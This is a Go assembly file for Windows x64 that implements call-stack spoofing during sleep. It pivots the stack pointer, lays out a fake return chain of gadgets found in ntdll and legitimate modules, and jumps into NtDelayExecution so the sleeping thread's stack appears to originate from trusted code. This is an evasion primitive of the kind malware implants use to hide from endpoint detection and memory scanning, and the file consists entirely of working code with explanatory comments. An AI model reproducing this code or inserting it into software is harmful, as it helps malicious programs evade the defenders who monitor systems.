//go:build windows && amd64

#include "textflag.h"

// func spoofedNtDelay(gadget, sleepFn, retGadget, delay uintptr)
//
// Spoofs the call stack while sleeping. Intended to run on a native (non-Go)
// thread, since it pivots SP — Go goroutine stacks must not be moved.
//
//   gadget   = address of a "jmp [bx]" gadget in ntdll (0xFF 0x23)
//   sleepFn  = address of NtDelayExecution
//   retGadget= address of a "ret" instruction in a legitimate module
//   delay    = pointer to a LARGE_INTEGER (negative QuadPart = relative 100ns)
//
// Fake stack layout (top of fake stack first):
//   [SP+0x00] = retGadget   (NtDelayExecution returns here)
//   [SP+0x08] = real return (retGadget returns here -> back to native caller)
//   [SP+0x10] = sleepFn     (BX points here; jmp [bx] -> NtDelayExecution)
TEXT ·spoofedNtDelay(SB), NOSPLIT|NOFRAME, $0-32
    MOVQ gadget+0(FP), R11
    MOVQ sleepFn+8(FP), R12
    MOVQ retGadget+16(FP), R13
    MOVQ delay+24(FP), R14

    MOVQ (SP), R15          // capture real return address
    SUBQ $0x50, SP
    ANDQ $~0xF, SP

    MOVQ R13, 0x00(SP)      // fake return: ret gadget
    MOVQ R15, 0x08(SP)      // real return (after the ret gadget)
    MOVQ R12, 0x10(SP)      // sleepFn
    LEAQ 0x10(SP), BX       // BX = &sleepFn

    XORL CX, CX             // Alertable = FALSE
    MOVQ R14, DX            // DelayInterval

    JMP R11                 // jmp [bx] -> NtDelayExecution
    // (unwinds through retGadget back to the real caller)
